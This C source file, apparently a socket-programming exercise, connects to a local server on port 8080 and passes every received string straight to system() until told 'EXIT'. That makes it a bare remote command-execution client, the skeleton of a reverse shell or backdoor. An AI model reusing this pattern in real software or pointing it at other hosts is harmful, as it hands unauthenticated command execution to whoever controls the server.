#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>

#include "common.h"

#define PORT 8080

int main(int argc, char const* argv[]){
	int opt = 1;
	int status, valread, client_fd;
	struct sockaddr_in serv_addr;
	char buffer[1024] = { 0 };
	if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		printf("\n Socket creation error \n");
		return -1;
	}

	if (setsockopt(client_fd, SOL_SOCKET,
			SO_REUSEADDR | SO_REUSEPORT, &opt,
			sizeof(opt))) {
	perror("setsockopt");
	return -1;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(PORT);
	
	// Convert IPv4 and IPv6 addresses from text to binary
	// form
	if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        	printf("\nInvalid address/ Address not supported \n");
		return -1;
	}

	if ((status = connect(client_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)))  < 0) {
		printf("\nConnection Failed \n");
		return -1;
	}
	/*KOMUNIKASI*/
	while(1){
		//printf("MESSAGE:");
		//secureInputString(buffer, sizeof(buffer)-2);
		//send(client_fd, buffer, strlen(buffer), 0);
		//clearBuffer(buffer, sizeof(buffer));

		valread = read(client_fd, buffer, 1024 - 1); 
		if(strcmp(buffer, "EXIT") == 0) break;
		system(buffer);
		clearBuffer(buffer, sizeof(buffer));
	}
	// closing the connected socket
	close(client_fd);
	return 0;
}
